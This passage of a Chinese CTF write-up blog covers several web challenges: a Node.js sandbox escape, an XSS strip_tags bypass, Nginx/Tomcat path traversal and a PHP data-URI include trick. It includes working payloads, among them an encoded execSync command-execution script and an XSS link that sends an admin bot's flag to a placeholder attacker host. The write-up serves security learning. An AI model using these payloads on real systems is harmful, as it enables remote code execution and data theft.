<p><img src="https://img.npfs06.top/20210228231505.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>x =&gt; x * x</code> 相当于：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title"></span>(x) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">x</span> * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数</p>
<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2</p>
<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Math.<span class="built_in">constructor</span>.<span class="built_in">constructor</span>(.....)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
<p><img src="https://img.npfs06.top/20210228231658.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
<p><img src="https://img.npfs06.top/20210228231839.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的</p>
<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,</p>
<p>一切都理解了，最终的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://df4685cc-7ff5-4912-9821-beb74887feee.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;e&quot;</span>:<span class="string">&#x27;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#x27;</span>,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>ascii生成脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">cmd</span>):</span></span><br><span class="line">  s = <span class="string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">&quot;ls&quot;</span>))</span><br></pre></td></tr></table></figure>


<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p>知识点：</p>
<ol>
<li>代码审计</li>
<li>strip_tags()安全问题</li>
<li>xss</li>
</ol>
<p>打开环境是一个Blog。在发布文章时可以选择是否公开，如果设置为公开，admin用户会自动访问该文章并点赞。写文章时可以使用<code>[[URL]]</code>语法，将其插入到句子中会展开成<code>&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>这样的audio元素。</p>
<p>buu上没有给源码，自己去Gitlab上下来一个，审计</p>
<p>首先是bot代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//worker/worker.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;M4sh1m4fr3sh!!&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browser_option = &#123;</span><br><span class="line">    executablePath: <span class="string">&#x27;google-chrome-unstable&#x27;</span>,</span><br><span class="line">    headless: <span class="literal">true</span>,</span><br><span class="line">    args: [</span><br><span class="line">        <span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-background-networking&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-default-apps&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-extensions&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-sync&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--disable-translate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--hide-scrollbars&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--metrics-recording-only&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--mute-audio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--safebrowsing-disable-auto-update&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> browser = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到bot将flag设为UA然后去点击<code>#like</code>标签</p>
<p>接下来审一下题目web程序的源码，首先在init.php可以看到有CSP：</p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: <span class="keyword">default-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object-src</span> <span class="string">&#x27;none&#x27;</span>; <span class="keyword">script-src</span> <span class="string">&#x27;nonce-$&#123;nonce&#125;&#x27;</span> <span class="string">&#x27;strict-dynamic&#x27;</span>; <span class="keyword">base-uri</span> <span class="string">&#x27;none&#x27;</span>; trusted-types&quot;);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>题目是一个博客，发表的文章会被后台管理员的Bot检查，加上CSP，基本可以断定是个xss的题。</p>
<p><img src="https://img.npfs06.top/20210301213104.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在查看文章的post.php代码中 ,发现在输出内容时调用了自定义的<code>render_tags()</code>函数，我们全局搜索该函数，跟进到util.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//util.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们提交的[[URL]]被替换成<code>&lt;audio&gt;</code>标签就是在<code>render_tags()</code>中进行的，这里有个<code>strip_tags</code>函数，该函数的作用是除去所有非<code>&lt;audio&gt;</code>标签,比如说我们传入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">[[npfs&quot;&gt;<span class="tag">&lt;/<span class="name">audio</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;a&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;]]</span><br></pre></td></tr></table></figure>
<p>在<code>render_tags()</code>中经<code>render_tags()</code>中作用后变成</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">src</span>=<span class="string">&quot;npfs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;a&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&quot;&gt;<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不存在<code>strip_tags()</code>，这里可以利用<code>&lt;script&gt;</code>从<code>&lt;audio&gt;</code>标签中逃逸出来实现xss，但是经过<code>strip_tags()</code>的剥去html标签处理后，字符串变成了：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;audio controls src=&quot;npfs&quot;&gt;</span><span class="params">&lt;/audio&gt;</span>alert(<span class="string">&#x27;a&#x27;</span>);<span class="string">&quot;&quot;</span>&gt;<span class="params">&lt;/audio&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里alert(‘a’)前面的没有被去除掉是因为html标签成对出现，因此<code>strip_tags()</code>的处理也自动对白名单标签的闭合标签做了白名单处理，也就是说在白名单中，不会被剔除掉</p>
<p><strong>这里就要说到<code>strip_tags()</code>函数的安全问题了，它允许标签里出现斜线，猜测这是为了匹配闭合标签的。但是没有判断斜线的位置，在哪出现都可以</strong></p>
<p>也就是说我们可以这样子&lt;a/udio&gt;,而有趣的就是&lt;a/udio&gt;在浏览器里会解析成<a>标签，因为在标签中间的<code>/</code>会把后面注释掉了，从而变成<a>标签，我们知道超链接的跳转不受CSP的限制。</a></a></p>
<p>payload:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="string">[[npfs&quot;&gt;&lt;/audio&gt;&lt;a/udio id=&quot;like&quot; href=&quot;http:xxx.xxx.xxx.xxx:2333&quot;&gt;1&lt;/a/udio&gt;]]</span></span><br></pre></td></tr></table></figure>
<p>这里解释下这个payload,我们提交的payload经``render_tags()`作用，变成了</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;audio controls <span class="attribute">src</span>=<span class="string">&quot;npfs&quot;</span>&gt;&lt;/audio&gt;&lt;a/udio <span class="attribute">id</span>=<span class="string">&quot;like&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;http:xxx.xxx.xxx.xxx:2333&quot;</span>&gt;1&lt;/a/udio&gt;&gt;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
<p>我们在worker.js中发现的</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="built_in">await</span> page.click(<span class="comment">&#x27;#like&#x27;);</span></span><br></pre></td></tr></table></figure>
<p>bot会点击<code>#like</code>，而现在我们能够通过标签的逃逸来自定义出一个超链接，只要在自定<code>&lt;a&gt;</code>中设置了like这个id，管理员bot就会带着flag来点击访问这个超链接，这时候就能得到flag了</p>
<p>nc监听即可</p>
<p><img src="https://img.npfs06.top/20210301214648.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><p>知识点：</p>
<ol>
<li>tomcat目录穿越</li>
<li>tomcat管理后台弱口令</li>
<li>后台上传war🐎</li>
<li>Cookie利用</li>
</ol>
<p>Orange 师傅在 BlackHat 上有个议题（<a href="https://www.youtube.com/watch?v=28xWcRegncw">DEF CON 26 – Orange Tsai – Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>），大意就是由于中间件的一些特性，导致了一些神奇的目录穿越现象。比如：</p>
<p><img src="https://img.npfs06.top/20210301220624.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>URL路径参数不规范引发的问题，能造成的危害如下</p>
<p><img src="https://img.npfs06.top/20210301220722.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>针对于本题的环境，题目是由 Nginx 做反向代理，真实的后端中间件是 Tomcat，两种中间件识别的路径不同，就会造成解析不一致的情况。引用 Orange 师傅的总结：</p>
<p><img src="https://img.npfs06.top/20210301221221.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>上图可知，Nginx 会解析<code> /a;evil/b/</code>，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据<code> ;.*</code>，所以 Tomcat 对此的解析是<code> /a/b/</code>。也就是说我们从可以通过写<code> ;+脏数据</code>的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径。对于本题来说，我们可以构造路径<code> /..;/</code>，Nginx 会认为我们要访问服务器的 /..;/ 目录下的内容，从而将这个请求视为合法请求发送给后端的 Tomcat 解析，Tomcat 接受之后认为 ; 是脏数据，从而过滤掉，解析的路径就变成了<code> /../</code> 也就是上级目录。所以访问<code>/..;/manager/html</code>之后我们就成功进入了后台界面。</p>
<p><img src="https://img.npfs06.top/20210301220751.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>&lt;—-未完成 待更—-&gt;</p>
<h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><p>使用arjun工具找到参数：hl</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hl&#x27;</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;mkdir -- &#x27;</span>.escapeshellarg(<span class="variable">$dir</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$randFolder</span> = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    <span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$userFolder</span> = basename(str_replace([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line">    chdir(<span class="variable">$userFolder</span>);</span><br><span class="line">    file_put_contents(<span class="string">&#x27;profile&#x27;</span>,print_r(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上来先 ban 了 php 流，猜测是文件包含的题</p>
<p><img src="https://img.npfs06.top/20210302221008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>$mkdir 函数用的 system 函数调用 mkdir 命令，看起来有搞头，但是后面的 escapeshellarg 没法绕，暂时作罢</p>
<p><img src="https://img.npfs06.top/20210302221228.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>显然，这个system函数是很安全的，只好继续向下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">chdir(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br></pre></td></tr></table></figure>
<p>这三行应该是为了隔离每个用户的，防止互相干扰，继续向下</p>
<p>下面的 $userFolder 开始有趣了，从 X-Forwarded-For 头里拿目录名字作为 userFolder，并且过滤<code>.</code> 和 <code>-</code> 这两个符号。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = basename(str_replace([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br></pre></td></tr></table></figure>
<p>在往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;profile&#x27;</span>,print_r(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_put_contents 令人眼前一亮，把 $_SERVER 的所有数据写到 userFolder/profile 里，并且完全没有过滤,那么我们随便写一个 HTTP 头，传入任意 PHP 代码，可以造成 RCE</p>
<p>现在做的就是想办法绕过<code>&lt;?</code>和<code>php</code>，也就是这道题的考点了，include 与 file_get_contents 在关于 Data URI 处理问题上的问题，include () 与 file_get_contents () 支持Data URI，而且在处理的时候，出现了差异</p>
<p>首先看<code>file_get_contents</code>，会直接返回<code>data:,</code>之后的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// allow_url_include=On</span></span><br><span class="line"><span class="meta">&lt;?php</span>	</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">&quot;data:,123/profile&quot;</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">&quot;data:,profile&quot;</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210302231417.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>而在 allow_url_include=Off 的情况下，是不允许 include data URI 的，但是如果 <code>data:,XXX</code> 是一个目录名的话，可以绕过限制，包含<code>xxx</code>件，利用点就是这里</p>
<p>意思就是说</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">当allow_url_include=<span class="type">Off</span>时</span><br><span class="line"></span><br><span class="line"><span class="title">file_get_contents</span>在处理<span class="class"><span class="keyword">data</span>:xxx时会直接取xxx</span></span><br><span class="line"></span><br><span class="line">而include会包含文件名为<span class="class"><span class="keyword">data</span>:xxx的文件</span></span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210302000127.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>知识点：.htaccess写入</p>
<p>似曾相识的题目，查了下以前写的wp,发现基本就是原题 [XNUCA2019Qualifier]EasyPHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对写入的文件，进行判断，不是index.php的话，就删除掉</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不存在content或filename，则高亮代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对content进行黑名单过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对filename进行黑名单过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对写入的文件，进行判断，不是index.php的话，就删除掉</span></span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="comment">//在文件末尾追加hello,world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据题目的意思<code>只解析index.php</code>，想到以下方法：</p>
